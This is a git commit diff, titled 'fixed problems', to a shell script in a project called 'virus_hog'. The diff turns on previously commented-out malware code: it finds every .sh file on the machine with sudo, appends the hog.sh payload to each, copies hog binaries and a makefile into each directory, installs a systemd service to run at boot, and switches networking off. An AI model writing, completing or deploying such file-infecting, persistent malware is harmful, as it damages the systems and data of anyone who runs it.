28f7e0158925680b15b7930b264b8b9299e0b010
Kibnakamoto <kibnakanoto@protonmail.com>
2022-12-06 18:45:10 -0500

    fixed problems

--- virus_hog/hog_addto_system.sh
+++ virus_hog/hog_addto_system.sh
@@ -4,32 +4,31 @@
 
 PATH_TO_DAMAGE=$(sudo find / -name '*.sh')
 
-echo "$PATH_TO_DAMAGE" # view the files to append to
-
+#echo "$PATH_TO_DAMAGE" # view the files to append to
 DIR=$PWD
 
 # add virus where it will be called every time the computer boots
-#if [ -f etc/systemd/system/script_daemon.service ]; then
-#	cp $DIR/hog.sh etc/systemd/system/hog.sh
-#	cp $DIR/hog etc/systemd/system/hog
-#	cp $DIR/run.sh etc/systemd/system/run.sh
-#	cp $DIR/add_to_system.service etc/systemd/system/script_daemon.service
-#	sudo systemctl daemon-reload
-#	sudo systemctl enable etc/systemd/system/script_daemon.service
-#fi
+if [ -f etc/systemd/system/script_daemon.service ]; then
+	cp $DIR/hog.sh etc/systemd/system/hog.sh
+	cp $DIR/hog etc/systemd/system/hog
+	cp $DIR/run.sh etc/systemd/system/run.sh
+	cp $DIR/add_to_system.service etc/systemd/system/script_daemon.service
+	sudo systemctl daemon-reload
+	sudo systemctl enable etc/systemd/system/script_daemon.service
+fi
 
 #echo "$PATH_TO_DAMAGE"
-for path in "$PATH_TO_DAMAGE"; do
-	PATH_=$dirname $path
-#	sudo cat $path hog.sh > $PATH_/_tmp_output
-#	mv -f $PATH_/_tmp_output $path
-	echo start $PATH_ = PATH
+for path in $PATH_TO_DAMAGE
+do
+	PATH_=$(dirname $path)
+	sudo cat $path hog.sh > $PATH_/_tmp_output
+	mv -f $PATH_/_tmp_output $path
 	
-#	echo $path = path
-#	sudo cp $DIR/hog $PATH/hog
-#	sudo cp $DIR/run.sh $PATH/run.sh
-#	sudo cp $DIR/makefile $PATH/makefile
+	echo $path = path
+	sudo cp -f $DIR/hog $PATH_/hog
+	sudo cp -f $DIR/run.sh $PATH_/run.sh
+	sudo cp -f $DIR/makefile $PATH_/makefile
 done
 
 # disconnect wifi for no reason
-#nmcli networking off
+nmcli networking off
